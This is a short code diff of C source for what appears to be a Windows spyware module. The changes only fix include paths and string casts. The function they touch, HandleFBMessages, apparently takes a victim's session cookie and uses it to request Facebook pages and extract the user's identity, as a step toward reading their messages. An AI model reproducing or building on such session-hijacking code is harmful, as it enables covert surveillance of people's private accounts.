@@ -1,9 +1,9 @@
 #include <windows.h>
 #include <stdio.h>
 #include <time.h>
-#include "../common.h"
-#include "../bss.h"
-#include "../LOG.h"
+#include "../../H4DLL/common.h"
+#include "../../H4DLL/bss.h"
+#include "../../H4DLL/LOG.h"
 #include "SocialMain.h"
 #include "NetworkHandler.h"
 
@@ -153,7 +153,7 @@ DWORD HandleFBMessages(char *cookie)
 		return SOCIAL_REQUEST_NETWORK_PROBLEM;
 	
 	// Identifica l'utente
-	ret_val = HttpSocialRequest(L"www.facebook.com", L"GET", L"/home.php?", 443, NULL, 0, &r_buffer, &response_len, cookie);	
+	ret_val = HttpSocialRequest((WCHAR *)L"www.facebook.com", (WCHAR *)L"GET", (WCHAR *)L"/home.php?", 443, NULL, 0, &r_buffer, &response_len, cookie);	
 	if (ret_val != SOCIAL_REQUEST_SUCCESS)
 		return ret_val;
 	parser1 = (BYTE *)strstr((char *)r_buffer, FB_USER_ID);
